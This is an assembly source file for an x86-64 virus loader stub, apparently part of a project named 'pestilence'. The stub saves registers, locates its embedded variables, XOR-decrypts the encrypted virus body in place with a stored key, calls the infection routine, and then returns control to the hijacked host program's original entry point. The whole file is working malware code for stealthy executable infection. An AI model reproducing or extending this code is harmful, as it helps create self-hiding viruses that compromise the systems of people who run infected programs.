


section .text
    global virus
	global loader_vars
extern pestilence
extern decrypt

virus:
	push rcx                   ; backup rcx
	push rdx                   ; backup rdx
	push rbx                   ; backup rbx
	push rsi                   ; backup rsi
	push rdi                   ; backup rdi
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15
	call setup_decrypt

setup_decrypt:
	pop rdx

	add rdx, loader_vars - setup_decrypt

	mov r8, rdx
	mov r9, rdx
	mov r14, rdx
	mov r15, rdx

	add r14, 8
	add r15, 16
	add r8, 28

	mov ecx, [r8]
	mov r9, [r9]; old_entry point
	mov r14, [r14]; encryption offset
	mov r15, [r15]; encryption size

	sub rdx, loader_vars - setup_decrypt
	sub rdx, setup_decrypt - virus
	add rdx, r14

	
	mov rdi, rdx ; buffer
	mov rsi, r15 ; size
	mov edx, ecx ; key

	push r9

	xor rbx, rbx	
	call de

	call pestilence

	jmp ret_original

de:
	cmp rbx, rsi
	jne xo	

	ret
xo:
	xor BYTE [rdi + rbx], dl
	inc rbx
	jmp de

ret_original : 

	pop rax
	pop r15                    ; restore r15
	pop r14                    ; restore r14
	pop r13                    ; restore r13
	pop r12                    ; restore r12
	pop r11                    ; restore r11
	pop r10                    ; restore r10
	pop r9                     ; restore r9
	pop r8                     ; restore r8
	pop rdi                    ; restore rdi
	pop rsi                    ; restore rsi
	pop rbx                    ; restore rbx
	pop rdx                    ; restore rdx
	pop rcx                    ; restore rcx

	push rax
	ret

	

loader_vars:
	db "relentry", "rloffset", "enc_size"
	db 0x6f,0xab,0x5a,0xff 
	db 0x41,0x42,0x43,0x41
	db 0xde,0xad,0xbe,0xef
	db 0xff,0xff,0xff,0xff	;4 bytes seeds for random keys
	


	;relentry = old_entrypoint
	;reloffset = where encryption starts
	;enc_size = how many size encrypted